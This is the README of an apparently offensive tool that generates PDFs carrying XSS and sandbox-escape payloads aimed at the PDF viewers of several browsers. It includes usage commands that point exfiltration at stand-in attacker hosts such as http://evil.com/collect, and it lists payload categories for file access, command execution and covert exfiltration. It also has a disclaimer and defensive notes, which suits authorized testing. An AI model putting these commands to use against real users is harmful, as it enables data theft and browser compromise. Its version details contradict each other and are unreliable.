# PDF-XSS Tool v4.0 - Consolidated Advanced PDF Payload Generator

## 🚀 PDF Browser Exploitation Framework

A consolidated and enhanced tool for generating PDF files with browser-specific XSS payloads designed to escape PDF sandbox restrictions. Now featuring sophisticated Chrome evasion techniques, expanded browser coverage, and streamlined script architecture.

## 📁 Project Structure

```
PDF-XSS/
├── pdf_xss_generator.py          # Main consolidated PDF generator (v4.0) - Primary tool
├── payload_tester.py             # Enhanced testing framework (v3.0)
├── results_analyzer.py           # Advanced results analysis (v3.0)
├── chrome.json                   # Chrome/PDFium specific payloads (87 payloads) - ENHANCED
├── firefox.json                  # Firefox/PDF.js specific payloads (28 payloads) - ENHANCED
├── safari.json                   # Safari/PDFKit specific payloads (22 payloads) - ENHANCED
├── adobe.json                    # Adobe Reader specific payloads (25 payloads) - ENHANCED
├── edge.json                     # Microsoft Edge specific payloads (22 payloads) - ENHANCED
├── requirements.txt              # Python dependencies (none required)
├── ENHANCED_DOCUMENTATION.md     # Comprehensive enhancement documentation
├── DEVELOPER_GUIDE.md            # Developer guidelines and contribution process
├── IMPROVEMENTS.md               # Feature improvements documentation
├── legacy_scripts/               # Legacy scripts (deprecated, kept for reference)
├── Files/                        # Generated PDF output directory
└── README.md                     # This file
```

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 Enhanced PDF Browser Targeting

### Browser-Specific JSON Databases
- **chrome.json**: Chrome/PDFium specific exploits (87 payloads) - **ENHANCED with 10 advanced evasion techniques**
- **firefox.json**: Firefox/PDF.js specific exploits (28 payloads) - **ENHANCED with modern SpiderMonkey techniques**
- **safari.json**: Safari/PDFKit specific exploits (22 payloads) - **ENHANCED with WebKit-specific features**
- **adobe.json**: Adobe Reader/Acrobat specific exploits (25 payloads) - **ENHANCED with XFA and multimedia techniques**
- **edge.json**: Microsoft Edge specific exploits (22 payloads) - **ENHANCED with Chromium-based features**

### Payload Categories
- **dom_access**: Browser DOM manipulation from PDF context (61 payloads)
- **advanced_evasion**: Modern Chrome/browser evasion techniques (60 payloads)
- **file_system**: Local file system access and directory traversal (14 payloads)
- **webkit_specific**: Safari WebKit specific exploits (14 payloads)
- **command_execution**: System command execution and process spawning (2 payloads)
- **sandbox_escape**: PDF sandbox restriction bypasses (3 payloads)
- **network_exfiltration**: Data exfiltration and covert channels (5 payloads)
- **csp_bypass**: Content Security Policy evasion techniques (5 payloads)
- **api_abuse**: PDF-specific API exploitation (7 payloads)
- **windows_integration**: Windows OS integration exploits (7 payloads)

### 🔥 NEW: Advanced Modern Evasion Techniques
- **WebAssembly Modules**: Minimal WASM execution for payload delivery
- **Crypto.subtle API**: Async key generation as execution triggers
- **Service Workers**: Data URI worker registration and execution
- **SharedArrayBuffer**: Atomic operations and memory manipulation
- **Modern Browser APIs**: Temporal, Intl, FinalizationRegistry exploitation
- **Advanced Obfuscation**: Template literals, Proxy handlers, Reflect API
- **Async Execution**: Promise chains, async generators, observer patterns
- **Memory Manipulation**: WeakMap, Symbol registry, BigInt coercion

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No additional dependencies required

### Installation
```bash
# Navigate to PDF-XSS directory
cd PDF-XSS

# List available browsers and payload counts
python3 pdf_xss_generator.py --list-browsers

# Generate Chrome PDF files
python3 pdf_xss_generator.py -b chrome -u http://test.com
```

## 📖 Usage

### Main Tools

1. **pdf_xss_generator.py** - Primary PDF generation tool (v4.0)
2. **payload_tester.py** - Enhanced testing and validation framework (v3.0)  
3. **results_analyzer.py** - Advanced analysis and reporting tool (v3.0)

### Basic Commands

```bash
# Show help and available options
python3 pdf_xss_generator.py --help

# List available browsers and payload counts
python3 pdf_xss_generator.py --list-browsers

# Generate Chrome PDF files with custom URL (87 enhanced payloads)
python3 pdf_xss_generator.py -b chrome -u http://test.com

# Generate Firefox PDF files (28 enhanced payloads)
python3 pdf_xss_generator.py -b firefox --count 5

# Generate all browsers (184 total payloads)
python3 pdf_xss_generator.py -b all -u http://webhook.site/xyz
```

### Browser-Specific PDF Generation

```bash
# Generate individual Chrome PDF files (one payload per file)
python3 pdf_xss_generator.py -b chrome -u http://test.com

# Generate single file with all Firefox payloads (one payload per page)
python3 pdf_xss_generator.py -b firefox --single-file -u http://evil.com

# Generate Safari PDF files with custom PDF version
python3 pdf_xss_generator.py -b safari --pdf-version 1.3 -u http://test.com

# Generate Adobe Reader PDF files
python3 pdf_xss_generator.py -b adobe -u http://webhook.site/xyz

# Generate Microsoft Edge PDF files
python3 pdf_xss_generator.py -b edge -u http://collaborator.com
```

### Enhanced Testing and Analysis

```bash
# Test Chrome payloads with comprehensive analysis
python3 payload_tester.py -b chrome --report

# Test all browsers with detailed reporting (184 payloads)
python3 payload_tester.py -b all --report

# Analyze latest test results with all features
python3 results_analyzer.py --all

# Show improvement recommendations
python3 results_analyzer.py --recommendations

# Show category and technique analysis
python3 results_analyzer.py --categories --techniques --risks

# Export analysis results
python3 results_analyzer.py --export txt
```

### Advanced Options

```bash
# Limit number of payloads
python3 pdf_xss_generator.py -b chrome --count 3 -u http://test.com

# Use older PDF version (weaker security)
python3 pdf_xss_generator.py -b firefox --pdf-version 1.3 -u http://test.com

# Custom output directory
python3 pdf_xss_generator.py -b safari -o CustomOutput -u http://test.com

# Single file mode (one payload per page)
python3 pdf_xss_generator.py -b adobe --single-file -u http://test.com

# Generate files for all advanced Chrome evasion techniques
python3 pdf_xss_generator.py -b chrome -u http://webhook.site/xyz --count 20
```

## 🏁 Command Line Flags

### PDF Generator (pdf_xss_generator.py)
| Flag | Description | Example |
|------|-------------|---------|
| `-h, --help` | Show help message | `python3 pdf_xss_generator.py --help` |
| `-b, --browser` | Target browser (required) | `-b chrome` |
| `-u, --url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o, --output-dir` | Output directory | `-o Files` |
| `--single-file` | One payload per page mode | `--single-file` |
| `--count` | Limit number of payloads | `--count 5` |
| `--pdf-version` | PDF version (1.0-2.0) | `--pdf-version 1.3` |
| `--list-browsers` | List available browsers | `--list-browsers` |

### Payload Tester (payload_tester.py)
| Flag | Description | Example |
|------|-------------|---------|
| `-b, --browser` | Target browser to test | `-b chrome` |
| `--report` | Generate detailed JSON report | `--report` |

### Results Analyzer (results_analyzer.py)
| Flag | Description | Example |
|------|-------------|---------|
| `-r, --report` | Specific report file to analyze | `-r test_report_xyz.json` |
| `--categories` | Show category analysis | `--categories` |
| `--techniques` | Show evasion technique analysis | `--techniques` |
| `--recommendations` | Show improvement recommendations | `--recommendations` |

## 📁 Output Files

**All generated PDF files are automatically stored in the `Files/` directory.**

The tool creates two types of output:

### Individual Files Mode (Default)
- One PDF file per payload
- Naming: `{browser}_{technique}_{timestamp}.pdf`
- Example: `chrome_parent_window_access_20240115_143022.pdf`

### Single File Mode (`--single-file`)
- Multiple PDF files, one payload per page
- Naming: `{browser}_payload_{number}_{timestamp}.pdf`
- Example: `firefox_payload_001_20240115_143025.pdf`

## 🎯 Key Features

### ✅ Major Enhancements in v4.0
- **Expanded Payload Collection**: Increased from 134 to 184 payloads (+37% improvement)
- **Enhanced Browser Coverage**: All browsers now have 22+ payloads with modern techniques
- **Advanced Testing Framework**: Comprehensive validation with complexity scoring (v3.0)
- **Sophisticated Analysis Tools**: Multi-dimensional analysis with recommendations (v3.0)
- **Modern CVE Coverage**: Updated with 2024 CVEs and latest evasion techniques
- **Quality Assessment**: Three-tier quality ranking with 96.7% validity rate
- **Browser Performance Ranking**: Comparative effectiveness analysis across all browsers

### 🔬 Testing Framework Features (v3.0)
- **Syntax Validation**: Advanced JavaScript parsing and structure verification
- **Complexity Scoring**: Multi-dimensional payload analysis (syntax, category, compatibility)
- **Browser Compatibility**: Cross-browser targeting effectiveness assessment
- **Quality Ranking**: HIGH/MEDIUM/LOW classification with detailed scoring
- **Comprehensive Reporting**: JSON reports with statistical analysis and recommendations
- **Performance Tracking**: Historical analysis and improvement suggestions

### 📊 Analysis Capabilities (v3.0)
- **Browser Performance Comparison**: Ranking and effectiveness metrics
- **Category Distribution Analysis**: Visual payload distribution with recommendations
- **Technique Effectiveness**: Usage patterns and success rate analysis
- **Risk Assessment**: Security impact evaluation and threat modeling
- **Improvement Recommendations**: AI-driven suggestions for payload enhancement
- **Export Functions**: Multiple output formats for security reporting
- **Results Analysis**: Comprehensive reporting with improvement recommendations

### 🗑️ Simplified Architecture
- **Merged Scripts**: Combined script.py + Another-Script.py into pdf_xss_generator.py
- **Integrated Utilities**: Payload merging functionality built into main generator
- **Streamlined Testing**: Simplified test_framework.py → payload_tester.py
- **Focused Analysis**: Simplified results_tracker.py → results_analyzer.py
- **Legacy Preservation**: Old scripts moved to legacy_scripts/ for reference

## 🔍 PDF Security Testing Examples

### Generate Test Files for Different Browsers
```bash
# Chrome PDF viewer testing
python3 script.py -b chrome -u http://collaborator.burp.com

# Firefox PDF.js testing  
python3 script.py -b firefox --single-file -u http://webhook.site/xyz

# Adobe Reader API testing
python3 script.py -b adobe -u http://requestbin.com/abc123

# Safari WebKit testing
python3 script.py -b safari --pdf-version 1.4 -u http://test.com
```

### Payload Categories Testing
Each browser JSON file contains categorized payloads:
- **DOM Access**: Test DOM manipulation capabilities
- **File System**: Test local file access restrictions
- **Command Execution**: Test system command execution
- **Network Exfiltration**: Test data exfiltration capabilities

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests

## 📈 Changelog

### Version 3.0 (Current) - Optimization and Simplification
- **✅ Browser-specific JSON databases**: Separate JSON files for each browser (chrome.json, firefox.json, etc.)
- **✅ Simplified script interface**: Single script.py with streamlined flags
- **✅ One payload per page option**: `--single-file` flag creates individual PDFs for each payload
- **✅ Complete payload visibility**: Full JavaScript payloads visible in PDF files with filename headers
- **✅ Removed complexity**: Eliminated Another-Script.py and merge_json_payloads.py
- **✅ OS-aware targeting**: Automatic adaptation of file paths based on operating system
- **✅ Improved documentation**: Updated README with clear examples and usage patterns

### Version 2.0 - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **20+ sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.